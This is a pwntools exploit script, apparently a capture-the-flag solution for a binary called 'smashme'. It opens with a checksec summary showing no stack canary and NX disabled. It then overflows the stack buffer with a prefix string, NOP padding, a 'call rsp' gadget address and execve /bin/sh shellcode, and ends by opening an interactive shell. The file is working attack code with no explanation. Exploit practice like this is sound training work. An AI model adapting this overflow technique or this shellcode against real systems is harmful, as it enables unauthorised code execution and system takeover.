'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
'''
from pwn import *

context.log_level='debug'

binary='smashme'

s=process(binary)
raw_input('start')
e=ELF(binary)
rop=ROP(binary)

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

call_rsp=0x400bfc

s.recvuntil('Welcome to the Dr. Phil Show. Wanna smash?')

payload='Smash me outside, how bout dAAAAAAAAAAA'
payload+='\x90'*(0x48-len(payload))
payload+=p64(call_rsp)
payload+=shellcode
s.sendline(payload)

s.interactive()
